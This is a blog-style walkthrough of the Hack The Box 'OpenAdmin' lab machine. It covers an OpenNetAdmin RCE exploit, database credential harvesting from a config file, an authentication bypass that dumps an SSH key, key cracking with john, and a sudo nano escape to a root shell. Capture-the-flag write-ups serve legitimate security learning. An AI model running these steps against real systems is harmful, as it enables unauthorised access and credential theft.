---
layout: post
title:  Openadmin
date:   2020-01-30
categories: htb-writeup
---

{:.text-centered}
### OPENADMIN@HTB

![Banner](../../../../assets/img/openadmin/Banner.png){:.image-centered}

Openadmin is an easy box from hackthebox. Ok let’s start.

### Quick Hack:

__Initial foothold:__ Port Scan > 80/http > /music site > login link > OpenNetAdmin panel > exploit for that version > modify and run it > get login details for jimmy.

__User1:__  ssh as jimmy > run id > find files for group internal > internal service running on localhost > ssh port forwarding > modify one script > open the service > get ssh key for joanna.

__User2:__ Crack the ssh key > ssh as joanna > user.txt

__Root:__  run sudo -l > one sudo command without password > GTFO bins > abusing the nano editor > root.txt

### INITIAL FOOTHOLD
Run nmap to find open ports. Nmap will show result like this:

![nmap scan](../../../../assets/img/openadmin/nmap.png){:.image-left}

We have two open ports; 22 is ssh and 80 is http. Open http in browser. Default apache config page,nothing interesting there. So let's run gobuster.

    gobuster dir -u http://10.10.10.171 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt

After running it will start to find other sites,the result will look loke this:

![gobuster](../../../../assets/img/openadmin/gobuster.png){:.image-left}

Let's go to the /music folder. It is a site itself. Look at the links on the site,login and create an account could be potential entry point to something interesting. Login link links to somewhere else "/ona".Open it,it opens to a new service. [OpenNetAdmin](http://opennetadmin.com/) . And also reveals its version; it is 18.1.1 .Search for exploit for this version of Opennetadmin.

![ona](../../../../assets/img/openadmin/ona_18.1.1.png){:.image-left}

    searchsploit opennetadmin

And it gives result of RCE is present on that version. one shell script and a metasploit module is present of the exploit.I took the shell [script](https://www.exploit-db.com/exploits/47691).

![searchsploit](../../../../assets/img/openadmin/nmap.png){:.image-left}

But the shell script does not work as it is,you have to do some modification to run it. So, I made the modifications and put it on github,get it from [here](https://www.github.com/opennetadmin_rce_18.1.1). Run it.

    ./script.sh http://10.10.10.171/ona 10.10.xx.xx

You will get a shell,but it is not a fully functional reverse shell. So from here you can upload a php reverse shell script and get a reverse shell and work with that. Or you can get the information what you need for the next step and close it. How to use php reverse shell I have explained in [networked](https://ald3rs0n.github.io/htb-writeup/2019/11/16/networked.html) writeup.

Ok,now you have got a shell as www-data,let's go for a user.

## US3R 1 - JIMMY

As www-data you will land on /opt/ona/www and you can't run *cd* here.Run *cat* on */etc/passwd* and you will get two users there *jimmy* and *joanna*.

    cat /etc/passwd

Run *ls* and you will see bunch of files and directories,start enumarating them. I am only showing the path where you will get something interesting.

    ls local/
    ls local/config/
    cat local/config/database_settings.inc.php


![local](../../../../assets/img/openadmin/local.png){:.image-left}

![dbpasswd](../../../../assets/img/openadmin/dbpasswd.png){:.image-left}

Here in this file you will get a password for the mysql database,grab that password and try to login with that as joanna and jimmy. You will be able to login as jimmy with that pasword. But here there is no user flag so you have to be joanna to get the user flag. Well as www-data you can also run local prevesc scripts like *linenum* or *linpeas*, but that didn't helped me so I am omitting that part.

## US3R 2 - JOANNA

Ok as always I try *ps -aux, sudo -l, id, crontab -l* etc to get basic idea about that user,group,what the user can do and if there is any cron running. *id* says jimmy is a member of a special group name *internal* . That's interesting,let's see who are the members of that group.

    cat /etc/group

We can see that joanna is also a member of that group. Ok,let's check files and folders belongs to that group.

    find / -group 1002 2>/dev/null #1002 is the id of that group

We get it:

![internal](../../../../assets/img/openadmin/internal.png){:.image-left}

Ok,let go there and see files.

    cd /var/www/internal
    ls -la

there are three files,but interesting one is *main.php*. *Cat* all the files and find what are there. In *main.php* it varifies if the user is authenticated as jimmy,if yes it runs command to cat private ssh key for joanna and prints it if not varified it redirects to authentication page. But how to reach to the internal directory from browser? We didn't get any directory for that in gobuster. Then what to do?

You can run:

    ss -lt

It will list all the listening port on tcp and among others there is a port __52846__. That is unknown and listening on localhost.
Or you can go to apache config directory and see whats going there.

    cd /etc/apache2/apache2.conf

At the bottom it says to look into *sites_enabled/* directory for virtual hosting. Going there we can find *internal.conf* file.

    cd sites-enabled/
    cat internal.conf


![vhosts](../../../../assets/img/openadmin/vhost.png){:.image-left}

It says it is listening on 127.0.0.1:52846. It it matches our previous finding from *ss -lt*.

Ok to reach to service listening on localhost we have to do ssh port forwarding.I have discussed it in details [here](https://ald3rs0n.github.io/techniques/2019/11/09/sshtunnel.html).

    ssh -L 8000:localhost:52846 jimmy@10.10.10.171

now open in browser *localhost:8000/main.php* . Damn!it redirects to index page for authentication. Ok get back to the box,go to the internal folder and copy the main into another file and open in vim to edit it.

    cp main.php main2.php
    vim main2.php

![main.php](../../../../assets/img/openadmin/main.php.png){:.image-left}

And then remove everthing that redirects to index page for authentication,mainly remove everything in the first line after *<?php* tag. Then open main2 in browser *localhost:8000/main2.php* . Gotcha! it prints ssh private key of joanna. Copy in and put in into a file and change its permissions.

    nano id_rsa #paste it here and save the file
    chmod 600 id_rsa

Try to login with it,and you can't,it asks for passphrase. Give that file to john to crack it.

    ./ssh2john id_rsa > id_rsa.john #converting it to a format that john can understand

    john id_rsa.john  -wordlist=/usr/share/wordlists/rockyou.txt

john cracks it very fast and gives the passpharse. 

Login with it as joanna and grab the flag:

    ssh -i id_rsa joanna@10.10.10.171

![user](../../../../assets/img/openadmin/user.txt.png){:.image-left}

## R00T

As joanna try:

    sudo -l

![sudo](../../../../assets/img/openadmin/sudol.png){:.image-left}

And joanna can run /bin/nano /opt/priv as sudo without password. Wow thats cool...How to exploit it? Go to [gtfobins](https://gtfobins.github.io/) and type nano to find how to exploit nano and at the end you can find how to get a shell when it is running with sudo previlage.

    Ctrl+r Ctrl+x
    reset; sh 1>&0 2>&0

Press enter and thats it,you get a shell as root.Go grab the flag and submit it. That's all.

![root flag](../../../../assets/img/openadmin/root.txt.png){:.image-left}

Hope you enjoyed; Happy Hacking.